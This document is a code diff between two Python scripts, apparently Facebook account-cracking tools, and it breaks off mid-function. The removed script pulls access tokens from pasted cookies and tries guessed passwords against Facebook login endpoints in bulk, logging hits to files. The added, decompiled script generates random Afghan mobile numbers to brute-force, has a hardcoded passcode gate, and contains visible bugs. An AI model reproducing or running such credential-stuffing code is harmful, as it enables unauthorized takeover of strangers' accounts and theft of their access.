@@ -1,464 +1,489 @@
-#!/usr/bin/python3
-#-*-coding:utf-8-*-
-# Update V1.6
+# decrypt by HEMAT KHAN
+# Decompiled from: Python 2.7.18 (default, Nov  12   2021, 23:31:00) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(20000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
 
-### Import Module
-import os
 try:
     import requests
 except ImportError:
-    print('\n Module requests !...\n')
-    os.system('pip install requests')
+    os.system('pip2 install mechanize')
 
 try:
-    import concurrent.futures
+    import mechanize
 except ImportError:
-    print('\n Module futures !...\n')
-    os.system('pip install futures')
+    os.system('pip2 install request')
+    time.sleep(1)
+    os.system('Then type: python2 Clone-fb.py')
 
-try:
-    import bs4
-except ImportError:
-    print('\n Module bs4 !...\n')
-    os.system('pip install bs4')
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent', 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]')]
 
-import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid
-from concurrent.futures import ThreadPoolExecutor as BilalBSN
-from datetime import datetime
-from bs4 import BeautifulSoup
+
+def keluar():
+    os.sys.exit()
 
 
-ct = datetime.now()
-n = ct.month
-bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
-try:
-    if n < 0 or n > 12:
-        exit()
-    nTemp = n - 1
-except ValueError:
-    exit()
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
 
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-op = bulan[nTemp]
-### WARNA RANDOM ###
-P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-B = '\x1b[1;94m' # BIRU
-U = '\x1b[1;95m' # UNGU
-O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'    # WARNA MATI
-my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
-#  CHIGOZIEWORLDWIDE.  #
-#------------------------------->
+    return cetak(d)
 
-############################ RESPONSE FACEBOOK ###########################################
-data,data2={},{}
-aman,cp,salah=0,0,0
-ubahP,pwBaru=[],[]
-ok = []
-cp = []
-id = []
-user = []
-loop = 0
-url_lookup = "https://lookup-id.com/"
-url_mb = "https://m.facebook.com"
-url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
-bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
-###########################################################################################
-done = False
-def animate():
-    os.system("clear")
-    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):
-        if done:
-            break
-        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)
-        sys.stdout.flush()
-        time.sleep(0.03)
-t = threading.Thread(target=animate)
-t.start()
-time.sleep(0.5)
-done = True
 
-# lempankkkkkkkk
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+
+
 def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
-        time.sleep(0.01)
+        time.sleep(0.1)
 
-# LO KONTOL
-def logo():
-	print("""%s
-   8888888b.   .d8888b.  888    888 
-888   Y88b d88P  Y88b 888    888 
-888    888 Y88b.      888    888 
-888   d88P  "Y888b.   8888888888 
-8888888P"      "Y88b. 888    888 
-888 T88b         "888 888    888 
-888  T88b  Y88b  d88P 888    888 
-888   T88b  "Y8888P"  888    888 
-                                 
-                                      
-"""%(O))
-
-def reg():
-    os.system('clear')
-    logo()
-    print ('')
-    print (' Checking Approval')
-    time.sleep(1) 
-    try:
-        to = open('/sdcard/Android/.Saadat.txt', 'r').read()
-    except (KeyError, IOError):
-        reg2()
-    r = requests.get('https://github.com/AFG-Raziq/text/blob/main/T.Txt').text
-    if to in r:
-        time.sleep(2)
-        bsn_menu()
-    else:
-        os.system('clear')
-        logo()
-        print('')
-        print ('\tApproved Not Detected')
-        print ('')
-        print (' \033[1;97mToken: ' + to)
-        print(' WhatsApp : +93702856593')
-        input('\033[1;97m Press Enter To Send Token')
-        os.system('xdg-open https://wa.me/+93702856593?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
-        reg()
-
-def reg2():
-    os.system('clear')
-    logo()
-    print('')
-    print ('\tApproval Not Detected')
-    print('')
-    id = uuid.uuid4().hex[:50]
-    print (' Token : ' + id)
-    print(' WhatsApp : +93776811468')
-    input(' Press Enter To Send Token ')
-    os.system('xdg-open https://wa.me/+93702856593?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
-    sav = open('/sdcard/Android/.Saadat.txt', 'w')
-    sav.write(id)
-    sav.close()
-    reg()
-
-
-
-#MASUK TOKEN
-def chigozie():
-    os.system('clear')
-    print (' %s*%s tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
-    cookie = input("\n %s[%s?%s] Cookies : %s"% (O,O,O,O))
-    if cookie in['OPEN','Open','open']:
-      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+923439635677');chigozie()
-    try:
-        head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': cookie}
-        asww=requests.get("https://business.facebook.com/creatorstudio/home", headers=head)
-        reqq=re.search('{"accessToken":"(EAA\w+)', asww.text)
-        tokn=reqq.group(1)
-        open('.cokie.txt', 'a').write(cookie)
-        open('.token.txt', 'a').write(tokn)
-        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokn)).json()['name']
-        print('\n\n %s*%s selamat datang %s%s%s'%(O,O,O,nama,O));time.sleep(2)
-        print(' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,O));time.sleep(2)
-        input(' %s*%s tekan enter '%(O,O))
-        os.system('xdg-open https://wa.me/+93702856593')
-        bsn_menu()
-    except AttributeError:
-        print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
-    except UnboundLocalError:
-        print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
-    except requests.exceptions.ConnectionError:
-        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(O,O,O))
-### ORANG GANTENG ###
-def hasil(OK,cp):
-    if len(OK) != 0 or len(cp) != 0:
-        print('\n----------------------------------------------')
-        print(' Your Process Complete...')
-        print('----------------------------------------------')
-        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mSaadat-ok.txt'%(O,O,str(len(ok))))
-        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mSaadat-cp.txt'%(O,O,str(len(cp))))
-        print('----------------------------------------------')
-        input(f"\n\033[1;97m Press Enter To Go Back ")
-        bsn_menu()
-
-def bsn_menu():
-    os.system('clear')
-    logo()
-    ipm = requests.get(url_ip).json() 
-    IP = ipm["origin"]
-    print(" [*]. CREATED BY |:-( Saadat )");time.sleep (0.03)
-    print(" [*]. Tysm To My All Frendz. (Saadat)");time.sleep (0.03)
-    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
-    print(" [*]. VERSION  3.0                                    ");time.sleep (0.03)   
-    print(" [*]. WP             +93702856593      ");time.sleep (0.03)
-    print(" [*]. This Tool was made in Saadat              ");time.sleep (0.03)
-    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
-    print(".[*] ---------------------------------------------");time.sleep(0.03)
-    print(" [*] A N O N Y M O U S  D A R K F A T E  ( Saadat )    ");time.sleep (0.03)
-    print(".[*] ---------------------------------------------");time.sleep(0.03)
-    print(".[*] This is a Premium Tool Bro                                 ");time.sleep (0.03)
-    print(".[*] You need to buy this tool for 1 month membership                       ");time.sleep (0.03) 
-    print(" [*] ---------------------------------------------");time.sleep(0.03)
-    print(" [*] IP ADDRESS        [%s]\n"%(IP));time.sleep(0.01)
-    print("   \033[1;97m              Menu")
-    print("-----------------=\<------------------")
-    print(" [1] File Cloning")
-    print(" [2] Follow Owner")
-    print(" [3] AFG Random")
-    print(" [0] Exit")
-    print("")
-    pepek = input(' Select : ')
-    if pepek in['1','01']:
-        __bsn__().bilo(id)
-            
-
-class __bsn__:
-
-    def __init__(self):
-        self.id = []
-
-    def bilo(self,id):
-        os.system('clear')
-        logo()
-        print("              file crack menu")
-        print(' -------------------------------------------')
-        print('')
-        self.cnt = input('%s [+] file name :%s '%(A,F))
-        self.id = open(self.cnt).read().splitlines()
-        os.system('clear')
-        logo()
-        print("")
-        ___worldwide___ = ('y')
-        if ___worldwide___ in ('yes','Yes','Y', 'y'):
-            os.system('clear')
-            logo()
-            print("              Method Menu")
-            print('-------------------------------------------')
-            print('')
-            print(' [+] Method 1')
-            print(' [+] Method 2')
-            print(' [+] Method 3 (Best)')
-            self.__pler__()
-        else:
-            print(' Choose Correct One');self.bilo(id)
-
-    def __api__(self, user, __chi__):
-        global ok,cp,loop
-        for i in list('\|-/'):
-            sys.stdout.write(f'\r [Saadat] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
-            sys.stdout.flush()
-        for pw in __chi__:
-            pw = pw.lower()
-            try: os.mkdir('results')
-            except: pass
-            p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
-            if "access_token" in p:
-                print('\r [OK-Saadat] %s | %s ' % (user,pw))
-                wrt = '%s|%s' % (user,pw)
-                ok.append(wrt)
-                open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
-                break
-            elif "www.facebook.com" in p["error_msg"]:
-                try:
-                    kontol = open('.token.txt').read()
-                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
-                    month, day, year = cp_ttl.split('/')
-                    month = bulan_ttl[month]
-                    print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
-                    wrt = '%s|%s' % (user,pw)
-                    cp.append(wrt)
-                    open('Saadat-cp.txt' , 'a').write('%s\n' % wrt)
-                    break
-                except (KeyError, IOError):
-                    month = ''
-                    day   = ''
-                    year  = ''
-                except:
-                    pass
-                print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
-                wrt = '%s|%s' % (user,pw)
-                cp.append(wrt)
-                open('Mudassir-cp.txt' , 'a').write('%s\n' % wrt)
-                break
-            else:
-                continue
-        loop += 1
-
-    def __metode__(self, user, __chi__, cebok):
-        global ok,cp,loop
-        sys.stdout.write(f'\r [Saadat] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+def tik():
+    titik = [
+     '.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;93mHEMAT KHAN\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92..99% \x1b[1;93m' + o,
         sys.stdout.flush()
+        time.sleep(1)
+       
+ #Aryan_Hack Youtube 
+
+
+
+def youtube():
+	Style_profaisor("  please subscribe youtube author :) Thank you")
+	os.system("https://youtu.be/lZWzKurhMi4")
+	menu()
+	
+#MY TELEGRAM GROUp
+
+def telegram():
+	Style_profaisor("  please Join To Telegram Group :) Thank you")
+	os.system("xdg-open https://t.me/hemt_hack")
+        
+back = 0
+oks = []
+id = []
+cpb = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+os.system('clear')
+os.system('toilet -f future  HEMAT HACKER')
+print '\x1b[1;96m A\xea\x9c\xb0\xc9\xa2\xca\x9c\xe1\xb4\x80\xc9\xb4\xc9\xaas\xe1\xb4\x9b\xe1\xb4\x80\xc9\xb4 F\xe1\xb4\x80\xe1\xb4\x84\xe1\xb4\x87\xca\x99\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b A\xe1\xb4\x84\xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x9b C\xca\x9f\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xca\x80'
+print 44 * '\x1b[1;91m\xe2\x94\x80'
+time.sleep(0.09)
+print '\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  Hemat Hack'
+print '\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  https://github.com/HemtKhan'
+print '\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  https://t.me/hemt_hack'
+time.sleep(0.05)
+print 44 * '\x1b[1;91m\xe2\x94\x80'
+jalan('\x1b[1;92mINPUT USERNAME & PASSWORD')
+print 25 * '\x1b[1;96m-'
+CorrectUsername = 'GHAZNI'
+CorrectPasscode = 'JALALZAI'
+loop = 'true'
+while loop == 'true':
+    username = raw_input('                   \x1b[1;93mINPUT USERNAME \x1b[1;96m: ')
+    if username == CorrectUsername:
+        print '\n            \x1b[1;92m        Correct\n                  '
+        loop = 'false'
+    else:
+        print '\x1b[1;91m\xe2\x98\xa0\xef\xb8\x8fWRONG'
+        os.system('xdg-open https://t.me/hemt_hack')
+
+loop = 'true'
+while loop == 'true':
+    passcode = raw_input('                   \x1b[1;93mINPUT PASSWORD \x1b[1;96m: ')
+    if passcode == CorrectPasscode:
+        print '\n            \x1b[1;92m        Correct\n                  '
+        jalan('[\xf0\x9d\x95\xb3\xf0\x9d\x95\xbf\xf0\x9d\x95\xbd] Logging in\x1b[1;93m \xe2\x97\x8f\x1b[1;91m \xe2\x97\x8f\x1b[1;96m \xe2\x97\x8f\x1b[1;95m \xe2\x97\x8f')
+        loop = 'false'
+    else:
+        print '\x1b[1;91m\xe2\x98\xa0\xef\xb8\x8fWRONG'
+        os.system('xdg-open https://t.me/HemtHack')
+
+def lisensi():
+    os.system('clear')
+    login()
+def login():
+    os.system('clear')
+    os.system('toilet CLONE AFG FB ACCOUNT -f future --filter metal')
+    print '\x1b[1;96m A\xea\x9c\xb0\xc9\xa2\xca\x9c\xe1\xb4\x80\xc9\xb4\xc9\xaas\xe1\xb4\x9b\xe1\xb4\x80\xc9\xb4 F\xe1\xb4\x80\xe1\xb4\x84\xe1\xb4\x87\xca\x99\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b A\xe1\xb4\x84\xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x9b C\xca\x9f\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xca\x80'
+    print '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
+    time.sleep(0.05)
+    jalan('\xe2\x95\x91\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  HEMAT KHAN         \xe2\x95\x91')
+    jalan('\xe2\x95\x91\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  https://github.com/HemtKhan \xe2\x95\x91')
+    jalan('\xe2\x95\x91\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  https://t.me/hemt_hack \xe2\x95\x91')
+    time.sleep(0.05)
+    print '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
+    print '\x1b[1;91m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m 7 DIGIT CRACKER'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m02\x1b[1;91m]\x1b[1;92m 8 DIGIT CRACKER'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m03\x1b[1;91m]\x1b[1;92m 9 DIGIT CRACKER'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m04\x1b[1;91m]\x1b[1;92m 10 DIGIT CRACKER'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m05\x1b[1;91m]\x1b[1;92m 11 DIGIT CRACKER'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m06\x1b[1;91m]\x1b[1;92m More Tools'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m07\x1b[1;91m]\x1b[1;92m Find me on'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m00\x1b[1;91m]\x1b[1;92m Exit'
+    login_pilih()
+  
+def login_pilih():
+    peak = raw_input('\n\x1b[1;96mSelect an Option\x1b[1;97m : ')
+    if peak == '':
+        print '\x1b[1;95mFill In Correctly'
+        login_pilih()
+    elif peak == '1':
+        Zeek()
+    elif peak == '2':
+        Zeek()
+    elif peak == '3':
+        Zeek()
+    elif peak == '4':
+        Zeek()
+    elif peak == '5':
+        Zeek()
+    elif peak == '6':
+        More()
+    elif peak == '7':
+        Find()
+    elif peak == '00':
+        Exit()
+
+
+def More():
+    os.system('clear')
+    os.system('xdg-open https://github.com/HemtKhan')
+    os.system('login')
+
+
+def Find():
+    os.system('clear')
+    os.system('toilet -f future Find Me --filter border')
+    jalan('\x1b[1;93m Author\x1b[1;96m     :\x1b[1;93m   HEMAT KHAN ')
+    jalan('\x1b[1;92m Github\x1b[1;96m     :\x1b[1;92m   HemtKhan')
+    jalan('\x1b[1;96m Telegram\x1b[1;96m   :\x1b[1;96m   https://t.me/hemt_hack')
+    os.system('xdg-open https://t.me/hemt_hack')
+    os.system('login')
+
+
+def Exit():
+    os.system('login')
+
+
+def Zeek():
+    os.system('clear')
+    os.system('toilet BEST  AFG  CRAK --filter gay -f standard')
+    print '\x1b[1;96m A\xea\x9c\xb0\xc9\xa2\xca\x9c\xe1\xb4\x80\xc9\xb4\xc9\xaas\xe1\xb4\x9b\xe1\xb4\x80\xc9\xb4 F\xe1\xb4\x80\xe1\xb4\x84\xe1\xb4\x87\xca\x99\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b A\xe1\xb4\x84\xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x9b C\xca\x9f\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xca\x80'
+    print 50 * '\x1b[1;91m-'
+    time.sleep(0.05)
+    print '\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  HEMAT KHAN'
+    print '\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  https://github.com/HemtKhan'
+    print '\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  https://t.me/hemt_hack'
+    time.sleep(0.05)
+    print 50 * '\x1b[1;91m-'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m Afghan Wireless'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m02\x1b[1;91m]\x1b[1;92m Afghan Wireless  \x1b[1;91m[\x1b[1;93m Mirror \x1b[1;91m]'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m03\x1b[1;91m]\x1b[1;92m Roshan'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m04\x1b[1;91m]\x1b[1;92m Roshan  \x1b[1;91m[\x1b[1;93m Mirror \x1b[1;91m]'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m05\x1b[1;91m]\x1b[1;92m Etisalat'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m06\x1b[1;91m]\x1b[1;92m Etisalat  \x1b[1;91m[\x1b[1;93m Mirror \x1b[1;91m]'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m07\x1b[1;91m]\x1b[1;92m Salaam'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m08\x1b[1;91m]\x1b[1;92m Afghan Telecom'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m09\x1b[1;91m]\x1b[1;92m MTN Telecom'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m10\x1b[1;91m]\x1b[1;92m MTN Telecom  \x1b[1;91m[\x1b[1;93m Mirror \x1b[1;91m]'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m11\x1b[1;91m]\x1b[1;92m Follow Me'
+    time.sleep(0.05)
+    print '\x1b[1;91m[\x1b[1;93m00\x1b[1;91m]\x1b[1;92m Exit'
+    time.sleep(0.05)
+    action()
+
+def action():
+    global cpb
+    global oks
+    peak = raw_input('\n\x1b[1;96mSelect an Option:\x1b[1;92m')
+    if peak == '':
+        print '[!] Fill In Correctly'
+        action()
+    elif peak == '1':
+        os.system('clear')
+        os.system('figlet -f small Afghan Wireless |lolcat')
         try:
-            for pw in __chi__:
-                pw = pw.lower()
-                session=requests.Session()
-                header = {
-                    "Host":cebok,
-                    "upgrade-insecure-requests":"1",
-                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                    "dnt":"1",
-                    "x-requested-with":"mark.via.gp",
-                    "sec-fetch-site":"same-origin",
-                    "sec-fetch-mode":"cors",
-                    "sec-fetch-user":"empty",
-                    "sec-fetch-dest":"document",
-                    "referer":"https://m.facebook.com/",
-                    "accept-encoding":"gzip, deflate br",
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-                }
-                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
-                das = {
-                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
-                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
-                    "uid":user,
-                    "flow":"login_no_pin",
-                    "pass":pw,
-                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
-                }
-                header1 = {
-                    "Host":cebok,
-                    "cache-control":"max-age=0",
-                    "upgrade-insecure-requests":"1",
-                    "origin":"https://"+cebok,
-                    "content-type":"application/x-www-form-urlencoded",
-                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                    "x-requested-with":"XMLHttpRequest",
-                    "sec-fetch-site":"same-origin",
-                    "sec-fetch-mode":"cors",
-                    "sec-fetch-user":"empty",
-                    "sec-fetch-dest":"document",
-                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
-                    "accept-encoding":"gzip, deflate br",
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-                }
-                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
-                if 'c_user' in session.cookies.get_dict():
-                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f'\r{H} [OK-Saadat] {user} | {pw}')
-                    wrt = '%s|%s' % (user,pw)
-                    ok.append(wrt)
-                    open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
-                    self.follow(session,coki)
-                    break
-                elif 'checkpoint' in session.cookies.get_dict():
-                    try:
-                        tokenz = open('.token.txt').read()
-                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
-                        month, day, year = cp_ttl.split('/')
-                        month = bulan_ttl[month]
-                        print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
-                        wrt = '%s|%s' % (user,pw)
-                        cp.append(wrt)
-                        open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
-                        break
-                    except (KeyError, IOError):
-                        month = ''
-                        day   = ''
-                        year  = ''
-                    except:pass
-                    print('\r%s \033[1;91m[CP-Saadat] %s | %s ' % (K,user,pw))
-                    wrt = '%s|%s' % (user,pw)
-                    cp.append(wrt)
-                    open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
-                    break
+            c = raw_input('\x1b[1;96mplz click Enter')
+            k = '070'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            blackmafiax()
+
+    elif peak == '2':
+        os.system('clear')
+        os.system('figlet -f small Afghan Wireless Mirror |lolcat')
+        try:
+            c = raw_input('\x1b[1;96mplz click Enter')
+            k = '0700'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            blackmafiax()
+
+    elif peak == '3':
+        os.system('clear')
+        os.system('figlet -f small Roshan |lolcat')
+        try:
+            c = raw_input('\x1b[1;96mplz click Enter')
+            k = '079'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            blackmafiax()
+
+    elif peak == '4':
+        os.system('clear')
+        os.system('figlet -f small Roshan Mirror |lolcat')
+        try:
+            c = raw_input('\x1b[1;96mplz click Enter')
+            k = '072'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
